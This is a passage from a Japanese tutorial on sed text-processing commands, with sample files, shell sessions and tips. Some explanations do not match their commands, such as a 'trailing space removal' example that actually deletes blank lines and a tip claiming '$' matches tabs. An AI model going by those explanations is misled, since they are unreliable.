<pre tabindex=0><code>$ cat dept.txt | sed  -e '/CSE/ s/Count/100/; /EEE/ s/Count/70/;'
CSE - 100
EEE - 70
Civil - Count
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>以外に知られていないトリッキーなsedの利用例ですが、とてもよく使われます。</dd>
</dl>
</div>
<h3 id=文字列に他のテキストが見つからない場合のみテキストを置き換える>文字列に他のテキストが見つからない場合のみテキストを置き換える</h3>
<p>次の<code>sed</code>コマンドは、テキスト「CSE」を含まない行の「Count」値を置き換えます。dept.txtファイルには、テキスト「CSE」を含まない2行が含まれています。したがって、「カウント」テキストは2行で80に置き換えられます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:dept.txt data-lang=:dept.txt>CSE - Count
EEE - Count
Civil - Count
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat dept.txt | sed '/CSE/! s/Count/80/;'
CSE - Count
EEE - 80
Civil - 80
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>!（アポストロフィー）をつけると「以外は」という意味になります。</dd>
</dl>
</div>
<h3 id=--1-を使用して一致するパターンの前に文字列を追加>' \ 1 &lsquo;を使用して、一致するパターンの前に文字列を追加</h3>
<p><code>sed</code>コマンドで一致するパターンマッチは、「\1」、「\2」などで示されます。</p>
<p>次の<code>sed</code>コマンドは、パターン&rsquo;Bash&rsquo;を検索し、パターンが一致する場合は、テキストを置き換える部分「bash」を&rsquo;\1&rsquo;として処理をします。<br>
ここでは、入力テキストで「Bash」というテキストが検索され、「\1」の前に1つのテキストが追加され、後に別のテキストが追加されます。</p>
<pre tabindex=0><code>$ echo &quot;Bash language&quot; | sed  's/\(Bash\)/Learn \1 programming/'
Learn Bash programming language
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>難しく考える必要はありません。&rsquo;s/(文字列)/ で文字列を検索します。その後、検索した文字列を \1 として、文字A \1 文字B として出力します。</dd>
</dl>
</div>
<h3 id=一致する行を削除>一致する行を削除</h3>
<p>&rsquo;d&rsquo;オプションは、ファイルから任意の行を削除するために<code>sed</code>コマンドで使用されます。os.txtという名前のファイルを作成し、次のコンテンツを追加して、 「d」オプションの機能をテストします。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os.txt | sed '/OS/ d'
Windows
Linux
Android
bash-5.1$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>d オプションは、delete（削除）です。</dd>
</dl>
</div>
<h3 id=一致する行の後の2行を削除>一致する行の後の2行を削除</h3>
<p>次のコマンドは、パターン「Linux」が見つかった場合、ファイルos.txtから3行を削除します。os.txtには、2行目に「Linux 」というテキストが含まれています。したがって、この行と次の2行は削除されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os.txt | sed '/Linux/,+2d'
Windows
</code></pre><h3 id=テキスト行の最後にあるすべてのスペースを削除>テキスト行の最後にあるすべてのスペースを削除</h3>
<p>[:blank:]クラス（といいます）を使用すると、テキストまたは任意のファイルのコンテンツからスペースとタブを削除できます。次のコマンドは、ファイルos.txt の各行の終わりにあるスペースを削除します。</p>
<p>以下のテキストの行末には半角スペースが３つづつついています。（みえないけど）</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os_space.txt data-lang=:os_space.txt>Windows   
Linux   
Android   
OS   
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os_space.txt
Windows
Linux
Android
OS
$
$ cat os_space.txt | sed '/^[[:blank:]]*$/d'
Windows
Linux
Android
OS
</code></pre><p>出力されたテキストには、半角スペースが除去されています（みえないけど）</p>
<h3 id=行で2回一致するすべての行を削除>行で2回一致するすべての行を削除</h3>
<p>次の内容のinput.txtという名前のテキストファイルを作成し、検索パターンを含むファイルの行を2回削除します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:input.txt data-lang=:input.txt>PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
</code></pre></div><p>input.txtファイルには一行に「PHP」というワードが２回表示される行が２行あります。<br>
以下の例では、<code>sed</code>コマンドの -e オプションを使って、sedコマンドを連続して使用し、パターン&rsquo;PHP&rsquo;を含む２行を削除します。</p>
<p>最初の<code>sed</code>コマンドは、各行の2番目に出現する&rsquo;PHP&rsquo;を&rsquo;dl&rsquo;に置き換え、次の<code>sed</code>コマンド「-e」で、テキスト&rsquo; dl &lsquo;を含む行を「dオプション」で削除します。</p>
<p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>cat input.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
$
$ cat input.txt | sed -e 's/php/dl/i2;' -e '/dl/d'
PHP is a server-side scripting language.
PHP is platform-independent.
</code></pre><h3 id=空行を削除>空行を削除</h3>
<p>この例をテストするには、コンテンツに空の行が含まれているファイルを選択します。前の例で作成されたinput.txtファイルには、次の<code>sed</code>コマンドを使用して削除できる2つの空の行が含まれています。ここで、「^$」は、ファイルinput.txtの空の行を見つけるために使用されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os_blank.txt data-lang=:os_blank.txt>Windows

Linux

Android

OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os_blank.txt
Windows

Linux

Android

OS

$ cat os_blank.txt | sed '/^$/d'
Windows
Linux
Android
OS
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>^$ は 行頭（^)と行末（$)の間になにもない（空行）という意味になります。ものすごく良く使います。</dd>
</dl>
</div>
<h3 id=出力できない文字をすべて削除>出力できない文字をすべて削除</h3>
<p>出力できない文字をnoneに置き換えることにより、出力できない文字を任意のテキストから削除できます。<br>
この例では、[:print:]クラスを使用して、出力できない文字を検索します。'\ t&rsquo;は出力できない文字なので、<code>echo</code>コマンドで直接解析することはできません。<br>
以下のコマンドを実行すると、「echo」コマンドで使用される変数$tabに「\t」文字が混入しても、<code>sed</code>コマンドで[:print:]に該当する文字&rsquo;\t&rsquo;が削除されます。</p>
<p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ tab=$'\t'
$ echo Hello&quot;$tab&quot;World
Hello	World
$ echo Hello&quot;$tab&quot;World | sed 's/[^[:print:]]//g'
HelloWorld
$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>上記のコマンドを実行すると、次の出力が表示されます。最初の<code>echo</code>コマンドはTAB付きで出力し、<code>sed</code>コマンドの[^[:print:]]出力できない文字であるタブスペースを削除し出力します。</dd>
</dl>
</div>
<h3 id=一致した場合行末に文字列を追加>一致した場合行末に文字列を追加</h3>
<p>次の<code>sed</code>コマンドは、 os.txtファイルのテキスト「Windows」を含む行の最後に「10」を追加します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os.txt
Windows
Linux
Android
OS
$ cat os.txt | sed '/Windows/ s/$/ 10/'
Windows 10
Linux
Android
OS
</code></pre><h3 id=一致した場合行前に行を挿入>一致した場合行前に行を挿入</h3>
<p>次の<code>sed</code>コマンドは、前に作成されたinput.txtファイルの「PHP is platform-independent」というテキストを検索します。ファイルのいずれかの行にこのテキストが含まれている場合、「PHP is an interpreted language」がその行の前に挿入されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:input.txt data-lang=:input.txt>PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>cat input.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
$
cat input.txt | sed '/PHP is platform-independent/ s/^/PHP is an interpreted language.\n/'
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is an interpreted language.
PHP is platform-independent.
</code></pre><h3 id=一致したら一致行の下に文字列を挿入>一致したら一致行の下に文字列を挿入</h3>
<p>次の<code>sed</code>コマンドは、ファイルos.txt内のテキスト&rsquo; Linux&rsquo;を検索し、テキストがいずれかの行に存在する場合は、新しいテキスト&rsquo; Ubuntu &lsquo;がその行の後に挿入されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです</p>
<pre tabindex=0><code>$ cat os.txt
Windows
Linux
Android
OS
$
$ cat os.txt | sed 's/Linux/&amp;\nUbuntu/'
Windows
Linux
Ubuntu
Android
OS
$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>&\n が自分自身の行のあとに改行という意味になります。</dd>
</dl>
</div>
<h3 id=一致しない場合は行末に文字列を追加>一致しない場合は行末に文字列を追加</h3>
<p>次の<code>sed</code>コマンドは、os.txt内でテキスト「Linux」を含まない行を検索し、各行の最後にテキスト「Operating System」を追加します。ここで、「$」記号は、新しいテキストが追加される行を識別するために使用されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><pre tabindex=0><code>$ cat os.txt
Windows
Linux
Android
OS
$ cat os.txt | sed '/Linux/! s/$/ Operating System/'
Windows Operating System
Linux
Android Operating System
OS Operating System
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>/Linux/! で、Linuxという文字列が行になければという意味、$は行末を意味します。Operation Systemの戦闘に空白が有るのがミソです。</dd>
</dl>
</div>
<h3 id=一致しない行を削除>一致しない行を削除</h3>
<p>web.txtという名前のファイルを作成し、次のコンテンツを追加して、一致するパターンを含まない行を削除します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:web.txt data-lang=:web.txt>HTML5
JavaScript
CSS
PHP
MySQL
JQuery
</code></pre></div><p>次の<code>sed</code>コマンドは、テキスト「CSS」を含まない行を検索して削除します。</p>
<p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat web.txt
HTML5
JavaScript
CSS
PHP
MySQL
JQuery
$
$ cat web.txt | sed '/CSS/!d'
CSS
</code></pre><p>上記のコマンドを実行すると、次の出力が表示されます。&lsquo;CSS&rsquo;というテキストを含むファイルに1行あります。したがってCSSを含む1行だけが出力され、CSSを含まない行は削除されます。</p>
<h3 id=テキストの後にスペースを追加した後一致したテキストを複製する>テキストの後にスペースを追加した後、一致したテキストを複製する</h3>
<p>次の<code>sed</code>コマンドは、ファイルpython.txt内の&rsquo;to&rsquo;という単語を検索します。その単語が存在する場合は、スペースを追加して、同じ単語が検索単語の後に挿入されます。ここでは、「&」記号を使用して重複テキストを追加しています。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:python.txt data-lang=:python.txt>Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
</code></pre></div><pre tabindex=0><code>$ cat python.txt
Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
$
$ cat python.txt | sed -e 's/to /&amp; to/g'
Python is a very popular language.
Python is easy to  touse. Python is easy to  tolearn.
Python is a cross-platform language
$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>意味のないサンプルとなりましたが、このコマンドを実行すると、「to」という単語がファイルpython.txtで検索され、この単語はこのファイルの2行目に存在することがわかります。結果、一致するテキストの後にスペースを含む「to 」が追加されます。</dd>
</dl>
</div>
<h3 id=文字列のリストの1つを新しい文字列に置き換える>文字列のリストの1つを新しい文字列に置き換える</h3>
<p>この例をテストするには、2つのリストファイルを作成する必要があります。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:list1.txt data-lang=:list1.txt>1001 =&gt; Jafar Ali
1023 =&gt; Nir Hossain
1067 =&gt; John Michel
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-:list2.txt data-lang=:list2.txt>1001    CSE     GPA-3.63
1002    CSE     GPA-3.24
1023    CSE     GPA-3.11
1067    CSE     GPA-3.84
</code></pre></div><p>次の<code>sed</code>コマンドは、上記の2つのテキストファイルの最初の列と一致し、一致するテキストをファイルlist1.txtの3番目の列の値に置き換えます。</p>
<p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat list1.txt
1001 =&gt; Jafar Ali
1023 =&gt; Nir Hossain
1067 =&gt; John Michel
$
$ cat list2.txt
1001    CSE     GPA-3.63
1002    CSE     GPA-3.24
1023    CSE     GPA-3.11
1067    CSE     GPA-3.84
$
$ sed `cat list1.txt | awk '{print &quot;-e s/&quot;$1&quot;/&quot;$3&quot;/&quot;}'`&lt;&lt;&lt;&quot;` cat list2.txt`&quot;
Jafar   CSE     GPA-3.63
1002    CSE     GPA-3.24
Nir     CSE     GPA-3.11
John    CSE     GPA-3.84
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>list1.txtファイルの1001、1023、1067は、list2.txtファイルの3つのデータと一致し、これらの値は、list1.txtの3番目の列の対応する名前に置き換えられます。</dd>
</dl>
</div>
<h3 id=一致した文字列を改行を含む文字列に置き換える>一致した文字列を改行を含む文字列に置き換える</h3>
<p>次のコマンドは、 <code>echo</code>コマンドから入力を受け取り、テキスト内の「Python」という単語を検索します。単語がテキストに存在する場合、新しいテキスト「Added Text」が改行で挿入されます。</p>
<pre tabindex=0><code>$ echo &quot;Bash Perl Python Java PHP ASP&quot; | sed 's/Python/Added Text\n/'
Bash Perl Added Text
 Java PHP ASP
</code></pre><h3 id=ファイルから改行を削除し各行の最後にカンマを挿入>ファイルから改行を削除し各行の最後にカンマを挿入</h3>
<p>次の<code>sed</code>コマンドは、ファイルos.txtの各改行をカンマに置き換えます。ここで、-zオプションは、行をNULL文字で区切るために使用されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os.txt
Windows
Linux
Android
OS
$ cat os.txt | sed -z 's/\n/,/g'
Windows,Linux,Android,OS,$
</code></pre><h3 id=カンマを削除し改行を追加してテキストを複数の行に分割>カンマを削除し、改行を追加して、テキストを複数の行に分割</h3>
<p>次の<code>sed</code>コマンドは、<code>echo</code>コマンドからカンマで区切られた行を入力として受け取り、カンマを改行に置き換えます。</p>
<pre tabindex=0><code>$ echo &quot;Kaniz Fatema,30th,batch&quot; | sed &quot;s/,/\n/g&quot;
Kaniz Fatema
30th
batch
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>上記のコマンドを実行すると、入力テキストのカンマは改行に置き換えられ3行で出力されます。</dd>
</dl>
</div>
<h3 id=大文字と小文字を区別しない一致を検索し行を削除>大文字と小文字を区別しない一致を検索し、行を削除</h3>
<p>次の<code>sed</code>コマンド&rsquo;I&rsquo;は、大文字と小文字を区別しないオプションです。一致で大文字と小文字を無視することを示します。</p>
<p>次の<code>sed</code>コマンドは、「linux」という単語を大文字小文字を区別せずに検索し、 os.txtファイルからその行を削除します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os.txt
Windows
Linux
Android
OS
$ cat os.txt | sed '/linux/Id'
Windows
Android
OS
</code></pre><h3 id=大文字と小文字を区別しない一致を見つけて新しいテキストに置き換える>大文字と小文字を区別しない一致を見つけて、新しいテキストに置き換える</h3>
<p>次の<code>sed</code>コマンドは、<code>echo</code>コマンドからの入力を受け取り、単語&rsquo;bash&rsquo;を単語&rsquo;PHP&rsquo;に置き換えます。</p>
<p>「Bash」という単語は、大文字と小文字を区別しない検索のために「bash」という単語と一致し、「PHP」という単語に置き換えられています。</p>
<pre tabindex=0><code>$ echo &quot;I like bash programming &quot; | sed 's/Bash/PHP/i'
I like PHP programming
</code></pre><h3 id=大文字と小文字を区別しない一致を見つけて同じテキストのすべて大文字に置き換える>大文字と小文字を区別しない一致を見つけて、同じテキストのすべて大文字に置き換える</h3>
<p>&lsquo;\U&rsquo;は、テキストをすべて大文字に変換します。次の<code>sed</code>コマンドは、 os.txtファイル内の単語&rsquo;linux&rsquo;を大文字小文字を区別せずに検索し、単語が存在する場合は、単語をすべて大文字に置き換えます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os.txt
Windows
Linux
Android
OS
$ cat os.txt | sed 's/\(linux\)/\U\1/Ig'
Windows
LINUX
Android
OS

</code></pre><h3 id=大文字と小文字を区別しない一致を見つけて同じテキストのすべての小文字に置き換える>大文字と小文字を区別しない一致を見つけて、同じテキストのすべての小文字に置き換える</h3>
<p>&lsquo;\L&rsquo;は<code>sed</code>で使用され、テキストをすべて小文字に変換します。次の<code>sed</code>コマンドは、os.txtファイルの「Linux」という単語を検索し、その単語をすべて小文字に置き換えます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os.txt
Windows
Linux
Android
OS
$ cat os.txt | sed 's/\(linux\)/\L\1/Ig'
Windows
linux
Android
OS
</code></pre><h3 id=テキスト内のすべての大文字を小文字に置き換える>テキスト内のすべての大文字を小文字に置き換える</h3>
<p>次の<code>sed</code>コマンドは、os.txtファイル内のすべての大文字を検索し、「\L」を使用して文字を小文字に置き換えます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os.txt
Windows
Linux
Android
OS
$
$ cat os.txt | sed  's/\(.*\)/\L\1/'
windows
linux
android
os
</code></pre><h3 id=行の番号を検索し番号の後に通貨記号を追加>行の番号を検索し、番号の後に通貨記号を追加</h3>
<p>以下のファイルを準備します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:items.txt data-lang=:items.txt>HDD       100
Monitor   80
Mouse     10
</code></pre></div><p>実行結果は以下の通りです。</p>
<pre tabindex=0><code>$ cat items.txt
HDD       100
Monitor   80
Mouse     10
$
$ cat items.txt | sed 's/\([0-9]\)/$\1/'
HDD       $100
Monitor   $80
Mouse     $10
</code></pre><p>上記のコマンドを実行すると、次の出力が表示されます。ここでは、各行の番号の前に「$」記号が追加されています。</p>
<h3 id=3桁を超える数値にカンマを追加>3桁を超える数値にカンマを追加</h3>
<p>次の<code>sed</code>コマンドは、<code> echo</code>コマンドからの入力として数値を受け取り、右から数えて3桁の各グループの後にカンマを追加します。ここで、「：a」はラベルを示し、「ta」はグループ化プロセスを繰り返すために使用されます。</p>
<pre tabindex=0><code>$ echo &quot;5098673&quot; | sed -e :a -e 's/\(.*[0-9]\)\([0-9]\{3\}\)/\1,\2/;ta'
5,098,673
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>ようするに桁区切りを<code>sed</code>コマンドで実現するということです。</dd>
</dl>
</div>
<h3 id=タブ文字を4つのスペース文字に置き換えます>タブ文字を4つのスペース文字に置き換えます</h3>
<p>次の<code>sed</code>コマンドは、各タブ（\ t）文字を4つのスペース文字に置き換えます。「$」記号は「sed」コマンドでタブ文字と一致するように使用され、「g」はすべてのタブ文字を置き換えるために使用されます。</p>
<p>実行結果は以下のとおりです。\tという文字列が</p>
<pre tabindex=0><code>$ echo -e &quot;1\t2\t3&quot; | sed $'s/\t/    /g'
1    2    3
</code></pre><h3 id=4つの連続するスペース文字をタブ文字に置き換えます>4つの連続するスペース文字をタブ文字に置き換えます</h3>
<p>次のコマンドは、4つの連続する文字をタブ（\ t）文字に置き換えます。</p>
<pre tabindex=0><code>$ echo -e &quot;1    2&quot; | sed $'s/    /\t/g'
1	2
</code></pre><h3 id=すべての行を最初の80文字に切り捨てます>すべての行を最初の80文字に切り捨てます</h3>
<p>この例をテストするには、80文字を超える行を含むin.txtという名前のテキストファイルを作成します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:in.txt data-lang=:in.txt>PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
</code></pre></div><pre tabindex=0><code>$ cat in.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.PHP is platform-independent.
$
$ cat in.txt | sed 's/\(^.\{1,80\}\).*/\1/'
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.PHP is platform-indepen
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>上記のコマンドを実行すると、次の出力が表示されます。in.txtファイルの2行目には、80文字を超える文字が含まれており、この行は出力で切り捨てられます。</dd>
</dl>
</div>
<h3 id=文字列の正規表現を検索しその後に標準テキストを追加>文字列の正規表現を検索し、その後に標準テキストを追加</h3>
<p>次の<code>sed</code>コマンドは、入力テキスト内のテキスト&rsquo; hello &lsquo;を検索し、そのテキストの後にテキスト&rsquo; John &lsquo;を追加します。</p>
<p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ echo &quot;hello, how are you?&quot; | sed 's/\(hello\)/\1 John/'
hello John, how are you?
</code></pre><h3 id=文字列の正規表現とその後に見つかった文字列の2番目のコピーを検索します>文字列の正規表現と、その後に見つかった文字列の2番目のコピーを検索します</h3>
<p>次の<code>sed</code>コマンドは、 input.txtの各行のテキスト「 PHP 」を検索し、各行の2番目の一致をテキスト「NewTextAdded」に置き換えます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:input.txt data-lang=:input.txt>PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat input.txt | sed 's/\(PHP\)/\1 (New Text added)/2'
PHP is a server-side scripting language.
PHP is an open-source language and PHP (New Text added) is case-sensitive.
PHP is platform-independent.
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>上記のコマンドを実行すると、次の出力が表示されます。検索テキスト「PHP 」は、 input.txtファイルの2行目と3行目に2回表示されます。そのため、2行目と3行目に「NewTextadded」というテキストが挿入されます。</dd>
</dl>
</div>
<h3 id=ファイルからの複数行のsedスクリプトの実行>ファイルからの複数行の<code>sed</code>スクリプトの実行</h3>
<p>複数の<code>sed</code>スクリプトをファイルに保存し、<code>sed</code>コマンドを実行することですべてのスクリプトを一緒に実行できます。&lsquo;sedcmd &lsquo;という名前のファイルを作成し、次のコンテンツを追加します。ここでは、2つの<code>sed</code>スクリプトがファイルに追加されています。1つのスクリプトがテキスト「PHP」を「ASP」に置き換えます。別のスクリプトがテキスト「独立」をテキスト「依存」に置き換えます。</p>
<pre tabindex=0><code class=language-sedcmd data-lang=sedcmd>s/PHP/ASP/
s/independent/dependent/
</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-:input.txt data-lang=:input.txt>PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat sedcmd
s/PHP/ASP/
s/independent/dependent/
$
$ cat input.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
$
$ cat input.txt | sed -f sedcmd
ASP is a server-side scripting language.
ASP is an open-source language and PHP is case-sensitive.
ASP is platform-dependent.
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>同様の検索ルールを別ファイルにしておくことで、何度も同じルールを書くことをしなくてすみます。必要なときにファイルを読み出せばよいわけです。</dd>
</dl>
</div>
<h3 id=複数行のパターンに一致し新しい複数行のテキストに置き換える>複数行のパターンに一致し、新しい複数行のテキストに置き換える</h3>
<p>次の<code>sed</code>コマンドは、複数行のテキスト&rsquo;Linux \ nAndroid&rsquo;を検索し、パターンが一致する場合、一致する行は複数行のテキスト&rsquo; Ubuntu \nAndroidLollipop&rsquo;に置き換えられます。ここで、PとDはマルチライン処理に使用されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os.txt
Windows
Linux
Android
OS
$
$ cat os.txt | sed '$!N;s/Linux\nAndroid/Ubuntu\nAndoid Lollipop/;P;D'
Windows
Ubuntu
Andoid Lollipop
OS
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>わけがわかりませんね。http://blog.livedoor.jp/morituri/archives/52036613.html　こちらを参考に。検索文字列は「sed Nコマンド」です。</dd>
</dl>
</div>
<h3 id=パターンに一致する2つの単語の順序を置き換えます>パターンに一致する2つの単語の順序を置き換えます</h3>
<p>次の<code>sed</code>コマンドは、<code> echo</code>コマンドから2つの単語の入力を受け取り、これらの単語の順序を置き換えます。</p>
<p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ echo &quot;perl python&quot; | sed -e 's/\([^ ]*\) *\([^ ]*\)/\2 \1/'
python perl
</code></pre><h3 id=コマンドラインから複数のsedコマンドを使用する>コマンドラインから複数のsedコマンドを使用する</h3>
<p>&lsquo;-e&rsquo;オプションは、コマンドラインから複数の<code>sed</code>スクリプトを実行するために<code>sed</code>コマンドで使用されます。次の<code>sed</code>コマンドは、<code> echo</code>コマンドからの入力としてテキストを受け取り、「Ubuntu」を「Kubuntu」に、「Centos」を「Fedora」に置き換えます。</p>
<p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ echo &quot;Ubuntu Centos Debian&quot; | sed -e 's/Ubuntu/Kubuntu/; s/Centos/Fedora/'
Kubuntu Fedora Debian
</code></pre><h3 id=sedを他のコマンドと組み合わせる>sedを他のコマンドと組み合わせる</h3>
<p>次のコマンドは、<code>sed</code>コマンドと<code>cat</code>コマンドを組み合わせたものです。最初の<code>sed</code>コマンドはos.txtファイルから入力を受け取り、テキスト'&lsquo;Linux&rsquo;を&rsquo;Fedora&rsquo;に置き換えた後、コマンドの出力を2番目の<code>sed</code>コマンドに送信します。2番目の<code>sed</code>コマンドは、テキスト「Windows」を「Windows10」に置き換えます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os.txt
Windows
Linux
Android
OS
$
$ cat os.txt | sed 's/Linux/Fedora/'| sed 's/windows/Windows 10/i'
Windows 10
Fedora
Android
OS
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>sedの連結は以下のように書くことができます。</dd>
</dl>
</div>
<pre tabindex=0><code>$ cat os.txt | sed -e 's/Linux/Fedora/' -e  's/windows/Windows 10/i'
Windows 10
Fedora
Android
OS
bash-5.1$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>sed -e と書くことで、パイプで渡すことなく、sedコマンドを連続して使うことができます。</dd>
</dl>
</div>
<h3 id=ファイルに空の行を挿入>ファイルに空の行を挿入</h3>
<p>次の内容のstdlist.txtを作成します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:stdlist.txt data-lang=:stdlist.txt>#ID #Name
[ 101 ]    -Ali
[ 102 ]    -Neha
</code></pre></div><p>「G」オプションは、ファイルに空の行を挿入するために使用されます。次の<code>sed</code>コマンドは、 stdlistファイルの各行の後に空の行を挿入します。</p>
<p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat stdlist.txt
#ID #Name
[ 101 ]    -Ali
[ 102 ]    -Neha
$
$ sed G stdlist.txt
#ID #Name

[ 101 ]    -Ali

[ 102 ]    -Neha

</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>一見、使われそうなGオプションですが、使うシチュエーションに出会ったことがありません。</dd>
</dl>
</div>
<h3 id=ファイルの各行からすべての英数字を削除>ファイルの各行からすべての英数字を削除</h3>
<p>次のコマンドは、 stdlistファイル内のすべての英数字をスペースに置き換えます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:stdlist.txt data-lang=:stdlist.txt>#ID #Name
[ 101 ]    -Ali
[ 102 ]    -Neha
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat stdlist.txt
#ID #Name
[ 101 ]    -Ali
[ 102 ]    -Neha
$
$ cat stdlist.txt | sed 's/[A-Za-z0-9]//g'
# #
[  ]    -
[  ]    -
$
</code></pre><h3 id=を使用して文字列と一致させる>「&」を使用して文字列と一致させる</h3>
<p>次のコマンドは、「L」で始まる単語を検索し、「Matched String is –」を「&」記号を使用して一致した単語に追加することでテキストを置き換えます。ここで、「p」は変更されたテキストを出力するために使用されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os.txt
Windows
Linux
Android
OS
$
$ cat os.txt | sed -n 's/^L/Matched String is - &amp;/p'
Matched String is - Linux
</code></pre><h3 id=単語のペアを切り替える>単語のペアを切り替える</h3>
